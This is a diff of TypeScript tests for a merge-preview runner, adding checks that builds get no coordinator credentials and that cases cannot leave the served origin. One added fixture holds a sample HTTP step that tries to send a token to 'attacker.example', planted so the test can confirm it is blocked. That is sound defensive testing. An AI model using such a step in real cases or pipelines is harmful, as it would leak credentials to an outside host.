@@ -29,7 +29,7 @@ const site: PreviewSite = { directory: 'dist', build: 'mkdir -p dist && cp -R si
 const copySite: StaticBuildShell = async (_command, cwd) => { execFileSync('sh', ['-c', 'mkdir -p dist && cp -R site/. dist/'], { cwd }); return { ok: true, output: '' }; };
 
 /** A repository whose site serves a score, with a required case reading it and an optional uat case; `best` is the score the merge serves. */
-async function repository(label: string, best: unknown) {
+async function repository(label: string, best: unknown, extraCases: Record<string, unknown>[] = []) {
   const root = await scratch(label), repo = join(root, 'repo'), base = join(root, 'worktrees');
   await mkdir(base);
   execFileSync('git', ['init', '-q', '-b', 'main', repo]);
@@ -40,6 +40,7 @@ async function repository(label: string, best: unknown) {
   await write('site/scores.json', { best });
   await write('e2e/cases/scores.json', { id: 'scores', title: 'A player sees the best score', tags: ['api'], target: 'any', required: true, steps: [http('/scores.json', [{ path: 'best', type: 'number' }])] });
   await write('e2e/cases/home.json', { id: 'home', title: 'The home page answers', tags: ['api'], target: 'uat', required: false, steps: [http('/')] });
+  for (const entry of extraCases) await write(`e2e/cases/${entry.id}.json`, entry);
   git(repo, 'add', '-A'); git(repo, 'commit', '-q', '-m', 'site and its cases');
   return { repo, base, mergeSha: git(repo, 'rev-parse', 'HEAD') };
 }
@@ -73,13 +74,13 @@ function ports(preview?: MergePorts['preview']) {
 test('unit:preview-failing-case-refuses-merge — a static-site repository\'s passing trial merge is built and served, every required and uat case runs against it, and a failing required case refuses the merge naming the case as a failed trial does', { timeout: 60_000 }, async () => {
   // The real preview: a checkout of the merge, the site built and served, the cases run over HTTP.
   const broken = await repository('preview-broken', 'none');
-  const failed = await runPreview({ root: broken.repo, base: broken.base, mergeSha: broken.mergeSha, site, token: '', timeoutMs: 30_000, stepTimeoutMs: 5_000 });
+  const failed = await runPreview({ root: broken.repo, base: broken.base, mergeSha: broken.mergeSha, site, timeoutMs: 30_000, stepTimeoutMs: 5_000 });
   assert.equal(failed.result, 'fail', failed.detail);
   assert.deepEqual(failed.failed, ['scores'], 'the failing required case is named');
   assert.deepEqual(failed.cases.map(entry => [entry.case, entry.verdict, entry.required]).sort(), [['home', 'passed', false], ['scores', 'failed', true]], 'every required and uat case ran');
   assert.equal(failed.mergeSha, broken.mergeSha);
   const fine = await repository('preview-fine', 42);
-  const passed = await runPreview({ root: fine.repo, base: fine.base, mergeSha: fine.mergeSha, site, token: '', timeoutMs: 30_000, stepTimeoutMs: 5_000 });
+  const passed = await runPreview({ root: fine.repo, base: fine.base, mergeSha: fine.mergeSha, site, timeoutMs: 30_000, stepTimeoutMs: 5_000 });
   assert.equal(passed.result, 'pass', passed.detail);
   assert.deepEqual(passed.failed, []);
 
@@ -117,13 +118,13 @@ test('unit:preview-skipped-when-not-applicable — a merge of only docs or tests
     repository: 'owner/project', baseBranch: 'main', githubAppId: 1234, hostId: 'machine-a', masterAgentName: 'graphyard-master-project', workers: [] });
   const called: string[][] = [];
   const reads = (environment: NodeJS.ProcessEnv) => mergeWriterReads(config, '/repo', async () => '', { base: '/worktrees', record: async () => ({}), merger: async () => 'control-plane', environment,
-    preview: async input => { called.push([input.mergeSha, input.site.directory, String(input.site.build), input.token]); return { result: 'pass', mergeSha: input.mergeSha, cases: [], failed: [], detail: '', durationMs: 0 }; } });
+    preview: async input => { called.push([input.mergeSha, input.site.directory, String(input.site.build), String('token' in input)]); return { result: 'pass', mergeSha: input.mergeSha, cases: [], failed: [], detail: '', durationMs: 0 }; } });
   assert.equal(await reads({}).preview!(mergeSha, ['src/game.ts'], work()), null, 'no static UAT, no preview');
   const staticSite = { GRAPHYARD_UAT_STATIC: 'dist', GRAPHYARD_UAT_BUILD: 'npm run build:site', GRAPHYARD_UAT_TOKEN: 'uat-token' };
   assert.equal(await reads(staticSite).preview!(mergeSha, ['docs/play.md', 'tests/game.test.ts'], work()), null, 'docs and tests only, no preview');
   assert.deepEqual(called, []);
   assert.equal((await reads(staticSite).preview!(mergeSha, ['src/game.ts'], work()))?.result, 'pass');
-  assert.deepEqual(called, [[mergeSha, 'dist', 'npm run build:site', 'uat-token']]);
+  assert.deepEqual(called, [[mergeSha, 'dist', 'npm run build:site', 'false']], 'the UAT token is never handed to the preview');
 
   // The executor with a skipping preview records and pushes exactly what it did without one.
   const without = ports(), skipped = ports(async () => null);
@@ -146,7 +147,7 @@ test('unit:preview-capped-and-cleaned-up — at most two previews run at once; e
     await copySite(command, cwd); active--;
     return { ok: true, output: '' };
   };
-  const runs = [0, 1, 2].map(() => runPreview({ root: fixture.repo, base: fixture.base, mergeSha: fixture.mergeSha, site, token: '', timeoutMs: 30_000, stepTimeoutMs: 5_000, shell: blockingShell, slots }));
+  const runs = [0, 1, 2].map(() => runPreview({ root: fixture.repo, base: fixture.base, mergeSha: fixture.mergeSha, site, timeoutMs: 30_000, stepTimeoutMs: 5_000, shell: blockingShell, slots }));
   const until = async (done: () => boolean) => { for (let index = 0; index < 400 && !done(); index++) await new Promise(accept => setTimeout(accept, 25)); assert.ok(done()); };
   await until(() => gates.length === 2);
   await new Promise(accept => setTimeout(accept, 200));
@@ -161,13 +162,13 @@ test('unit:preview-capped-and-cleaned-up — at most two previews run at once; e
   assert.deepEqual(await previewDirectories(fixture.base), [], 'every passing preview\'s checkout removed');
 
   // Fail: the build fails; timeout: the build never ends within the budget. Either way the checkout goes.
-  const failedBuild = await runPreview({ root: fixture.repo, base: fixture.base, mergeSha: fixture.mergeSha, site, token: '', timeoutMs: 30_000, shell: async () => ({ ok: false, output: 'boom' }) });
+  const failedBuild = await runPreview({ root: fixture.repo, base: fixture.base, mergeSha: fixture.mergeSha, site, timeoutMs: 30_000, shell: async () => ({ ok: false, output: 'boom' }) });
   assert.equal(failedBuild.result, 'fail'); assert.deepEqual(failedBuild.failed, ['build']);
   assert.deepEqual(await previewDirectories(fixture.base), []);
   // Timeout in the build: the build is cancelled, and its late continuation still holds the slot and the checkout until it ends.
   const timeoutSlots = previewSlots();
   let buildCancelled = false, buildEnded = false;
-  const lateBuild = runPreview({ root: fixture.repo, base: fixture.base, mergeSha: fixture.mergeSha, site, token: '', timeoutMs: 1_000, slots: timeoutSlots,
+  const lateBuild = runPreview({ root: fixture.repo, base: fixture.base, mergeSha: fixture.mergeSha, site, timeoutMs: 1_000, slots: timeoutSlots,
     shell: async (_command, cwd, signal) => {
       await new Promise<void>(accept => signal!.addEventListener('abort', () => accept(), { once: true }));
       buildCancelled = true;
@@ -192,7 +193,7 @@ test('unit:preview-capped-and-cleaned-up — at most two previews run at once; e
     if (String(input).endsWith('/healthz')) return fetch(input, init);
     return new Promise<Response>((_, reject) => init!.signal!.addEventListener('abort', () => { aborted++; expiredAt ||= Date.now(); reject(new Error('aborted')); }, { once: true }));
   };
-  const caseTimeout = await runPreview({ root: fixture.repo, base: fixture.base, mergeSha: fixture.mergeSha, site, token: '', timeoutMs: 1_500, stepTimeoutMs: 20_000, shell: copySite, fetcher: hangingFetcher, slots: caseSlots });
+  const caseTimeout = await runPreview({ root: fixture.repo, base: fixture.base, mergeSha: fixture.mergeSha, site, timeoutMs: 1_500, stepTimeoutMs: 20_000, shell: copySite, fetcher: hangingFetcher, slots: caseSlots });
   assert.equal(caseTimeout.result, 'timeout', caseTimeout.detail);
   assert.ok(requests >= 2 && aborted === 1, `the in-flight case request was aborted (${requests} requests, ${aborted} aborted)`);
   assert.equal(afterTimeout, 0, 'no case, attempt or step started after the budget ran out');
@@ -215,6 +216,41 @@ test('unit:preview-capped-and-cleaned-up — at most two previews run at once; e
   assert.deepEqual(await sweepPreviewCheckouts(base, { procRoot: proc }), [dead]);
   assert.equal(existsSync(dead), false); assert.equal(existsSync(tempOwnerMarker(dead)), false, 'the marker goes with it');
   for (const kept of [live, unmarked, other]) assert.ok(existsSync(kept), `${kept} is kept`);
+});
+
+test('unit:preview-holds-no-coordinator-credential — the merge\'s build runs with the host basics only, its cases with a throwaway token whose requests stay on the served origin, and a cancelled preview kills its command steps\' processes', { timeout: 60_000 }, async () => {
+  // The build: a candidate's build script sees PATH and HOME, never the coordinator's credentials.
+  const fixture = await repository('preview-isolated', 42, [{ id: 'leak', title: 'A case reaching for another host', tags: ['api'], target: 'uat', required: true,
+    steps: [{ kind: 'http', method: 'GET', path: '//attacker.example/{{token}}', status: 200 }] }]);
+  const host = { PATH: process.env.PATH, HOME: '/home/builder', GRAPHYARD_UAT_TOKEN: 'uat-secret', GITHUB_TOKEN: 'gh-secret', GRAPHYARD_TOKEN: 'gy-secret' };
+  let buildEnvironment: NodeJS.ProcessEnv | undefined;
+  const recordingShell: StaticBuildShell = async (command, cwd, _signal, env) => { buildEnvironment = env; return copySite(command, cwd); };
+  const requested: { url: string; authorization: string }[] = [];
+  const recordingFetcher: typeof fetch = async (input, init) => {
+    requested.push({ url: String(input), authorization: String(new Headers(init?.headers).get('authorization')) });
+    return fetch(input, init);
+  };
+  const verdict = await runPreview({ root: fixture.repo, base: fixture.base, mergeSha: fixture.mergeSha, site, timeoutMs: 30_000, stepTimeoutMs: 5_000, shell: recordingShell, fetcher: recordingFetcher, hostEnvironment: host });
+  assert.deepEqual(buildEnvironment, { PATH: process.env.PATH, HOME: '/home/builder' }, 'the build holds no coordinator credential');
+  assert.equal(verdict.result, 'fail', verdict.detail);
+  assert.deepEqual(verdict.failed, ['leak'], 'a case leaving the served origin fails without sending its request');
+  assert.ok(requested.length > 0 && requested.every(request => new URL(request.url).hostname === '127.0.0.1'), JSON.stringify(requested));
+  assert.ok(requested.every(request => !/uat-secret|gh-secret|gy-secret/.test(request.authorization)), 'no coordinator token is sent');
+  assert.ok(requested.some(request => /^Bearer preview-/.test(request.authorization)), 'the cases carry the preview\'s own token');
+
+  // A command step in flight when the budget runs out: its process group is killed and the slot freed at once, not at the step's own ten-minute timeout.
+  const marker = join(await scratch('preview-command'), 'still-running');
+  const hanging = await repository('preview-command', 42, [{ id: 'hang', title: 'A command that never ends', tags: ['api'], target: 'uat', required: true,
+    steps: [{ kind: 'command', run: `sleep 30 && touch ${marker}`, timeoutSeconds: 600 }] }]);
+  const slots = previewSlots(), began = Date.now();
+  const timedOut = await runPreview({ root: hanging.repo, base: hanging.base, mergeSha: hanging.mergeSha, site, timeoutMs: 2_000, stepTimeoutMs: 5_000, shell: copySite, slots });
+  assert.equal(timedOut.result, 'timeout', timedOut.detail);
+  assert.ok(Date.now() - began < 10_000, `the preview ended at its budget, not the command's (${Date.now() - began} ms)`);
+  assert.equal(slots.running, 0);
+  assert.deepEqual(await previewDirectories(hanging.base), []);
+  let sleepers = '';
+  try { sleepers = execFileSync('pgrep', ['-f', `sleep 30 && touch ${marker}`], { encoding: 'utf8' }).trim(); } catch { /* pgrep exits 1 when nothing matches */ }
+  assert.equal(sleepers, '', 'no process of the cancelled command step outlives the preview');
 });
 
 test('unit:preview-verdict-recorded — the preview verdict is recorded with the merge\'s trial record, kept by the ledger fold, and so shown by status', async () => {
